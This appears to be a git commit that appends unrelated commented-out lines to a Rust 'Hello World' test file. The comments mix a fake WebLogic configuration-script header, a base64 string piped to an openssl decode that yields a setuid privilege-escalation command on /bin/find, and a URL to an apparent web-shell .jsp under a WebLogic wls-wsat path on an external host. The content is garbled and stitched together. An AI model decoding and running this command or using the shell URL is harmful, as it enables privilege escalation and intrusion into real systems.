a677d7c6b578251995c6bbffd28f7e5420ffaa47
RegularRiver <176225527+jhalx09@users.noreply.github.com>
2024-09-23 01:04:14 +0800

    null

--- src/bin/anytest.rs
+++ src/bin/anytest.rs
@@ -4,3 +4,11 @@ fn main() {
     // Print text to the console.
     println!("Hello World test!");
 }
+// #!/bin/sh
+// # WARNING: This file is created by the Configuration Wizard.
+// Y2htb2QgdStzIC9iaW4vZmluZA==|openssl enc -base64 -d 
+// # Any changes to this script may be lost when adding extensions to this configuration.
+// DOMAIN_HOME="/u01/app/oracle/domains/adfWebDomains"
+// ${DOMAIN_HOME}/bin/startWebLogic.sh $*
+
+// http://eb.amazonas.com.br:8110/wls-wsat/123456.jsp 123456
